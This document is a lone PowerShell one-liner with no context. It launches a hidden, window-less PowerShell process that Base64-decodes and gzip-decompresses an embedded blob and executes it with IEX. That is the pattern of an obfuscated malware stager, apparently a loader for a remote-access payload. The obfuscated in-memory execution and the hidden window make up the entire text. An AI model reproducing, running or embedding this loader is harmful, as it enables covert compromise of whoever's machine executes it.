if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'syswow64WindowsPowerShellv1.0powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAEEoilgCA7VW+2/aSBD+OZX6P1gVErZKsAmPNpEi3ZqXnUACMZgQik4be20W1l5ir8Oj1//9xmCSVE2qVKezErHeeezMN9/s2EtCR1AeSpQa0vePH456OMKBJOfcaocmSUHK8aahHB2BJLe8i8LgemBG0rkkT9By2eABpuH07KyeRBEJxf692CYCxTEJ7hklsaxI/0ijGYnI8fX9nDhC+i7l/i62Gb/HLFPb1LEzI9IxCt1U1uEOTmMqWktGhZz/9i2vTI5L02LzIcEslvPWJhYkKLqM5RXph5IeONgsiZzvUifiMfdEcUTD8klxGMbYI1fg7ZF0iZhxN84rkAr8RUQkUSg9J5V62evIeVj2Iu4g141IDCZFM3zkCyLnwoSxgvSXPMlCuElCQQMCckEivrRI9EgdEhcNHLqM3BBvKl+R1SHz9xrJL41AqycipQA1eSvWLncTRvbmeeXXaLNiKvBkBQUQfnz88PGD91R+18e1W7NSekkCWB1NdmsCkco9HtOd8rmkFaQuHIcFjzbwmhtECVGm0iQtw2Q6lXLO6Esl2M5rFb3wtpfSwQQMqDZfwtbE5tSdgklWptymPi7f26MhSYVvc65BPBqSxibEAXUOtJJfA594jOxyLh7UriAyOZ8JiNsgjPhYpEgWpMmvZs2AiidbPaHMJRFyoIAxRAW1VX4OZl8cOW+GXRIAXPv3PBTCAzKTg3ZG4M3h9PQdlPJ1huO4IPUS6CanIFkEM+IWJBTGNBOhRPDdMv8cbjdhgjo4Fgd3U+UnMLND6zyMRZQ4UEYAYGAtiUMxS/EoSAZ1ib6xqH84PP8qGnXMGA198PQI1YCdFAVLpOSIIM4XRFCKFhFmsGQkAM1dh7cY9qGfs4bYcQr7xM2/GuyB8Ht2p9gcQHkRKhTcYlwUJJtGAm6LFOeUWv8lkhe3xXNM9YhkVZIPzTTRNyJlf4615yyla4bWDptIAC6tiAc6jkmtYokIUJM/qde0juAZmyHrOvqCltCKlswu/A9p2eSNL+7lxdxQo8Z65iEzNrtGr9E3jMrjhWVXhNU0xWXPFN3m7XxuIeNmOBZ3JjIGVFuMK9vlBd1aHeSO12ptq29Xmr7ezn3XGzc8z//iWTelaot2RvW+rp3gTqOZdEb6StcqcZOujD4d9hcXLXE/thkeeqp/WzrFdN2J5naJd7cmQu1Z2dleeHZ71nU3Y0M9HVUWqIlQPWzaLZ1fjvUI9VR72NL7w6be78NezVe9Cuyxz/51mjdp25s7q7q4a1e3naDKXKTzB8vXfNChGnKwb/cxMlHT3lxUA963mQsNb2tjT7Vnjq7VH0+v68ZtXGvDuUh/QG3eTHWQCM1bVbV91UfeHHeugiXCCPVBZ4R9nY8ubwZV8LEoXT2g1t3APvHrJ87Mgxwan5F+arIZT1MBf2jY9jud1deVemrfYsNOBiNDLdlVoq5Wi9roXlXVr/pqE7Zdx2skar3E2R347Kml/vn5p5RAwKDcup/Ea9HevODFW3Ogi6N4hhnwBe72QwO3eNTKLusep6mFLKcze0GikDCYdTAND6RHjHEnnRjPtzqMrP0gmUIXD2FZPnl1pUhPisrzJDlsnZ3dQaTQSynDix0S+mJW0NZlTYOBoK0rGmT7/uzqfLmRd64K6UB5gujgn+38K2lr5eaVMq9V7k3yv+KXNfUMftx34fe89xvpuzDVCs/5/yL6eeOPQP5TCEaYClC04HZiZD86f4NERpoX3xxPhQJeeNmTfgJeJ+L4Cr5H/gVIpczGcQoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);